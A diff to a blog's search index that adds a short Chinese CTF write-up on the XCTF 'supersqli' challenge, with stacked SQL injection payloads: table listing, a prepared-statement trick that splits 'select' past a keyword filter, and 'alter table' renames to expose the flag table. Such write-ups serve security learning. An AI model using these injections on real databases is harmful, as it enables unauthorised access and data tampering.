@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>web基础漏洞</title>
+      <link href="/2022/01/27/web%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2022/01/27/web%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h2 id="在select被禁止的时候："><a href="#在select被禁止的时候：" class="headerlink" title="在select被禁止的时候："></a>在select被禁止的时候：</h2><p>攻防世界：<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5417&page=1">supersqli</a></p><ul><li>可以使用堆叠注入：就是不使用sql查询语句，而是使用类似show databases;这样的命令来查看数据库中的内容。还有</li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> cloumns <span class="keyword">from</span> `table_name`;</span><br></pre></td></tr></table></figure><ul><li>可以使用预编译来绕过</li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;sEt @sql = CONCAT(&#x27;</span>se<span class="string">&#x27;,&#x27;</span>lect <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;); 定义变量</span></span><br><span class="line"><span class="string">prEpare stmt from @sql; 进行预编译</span></span><br><span class="line"><span class="string">EXECUTE stmt; # 执行</span></span><br></pre></td></tr></table></figure><ul><li>还有一种办法就是把flag所在的地方修改成原先提供正常的查询的位置，比如下面的words的位置</li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">;  <span class="keyword">alter</span> <span class="keyword">table</span>s words rename <span class="keyword">to</span> words1; </span><br><span class="line">;  <span class="keyword">alter</span> <span class="keyword">table</span>s `<span class="number">1919810931114514</span>` rename <span class="keyword">to</span> words ;</span><br><span class="line">;  <span class="keyword">alter</span> <span class="keyword">table</span>s words change flag id <span class="type">varchar</span>(<span class="number">50</span>); #</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Hello World</title>
       <link href="/2022/01/21/hello-world/"/>
       <url>/2022/01/21/hello-world/</url>
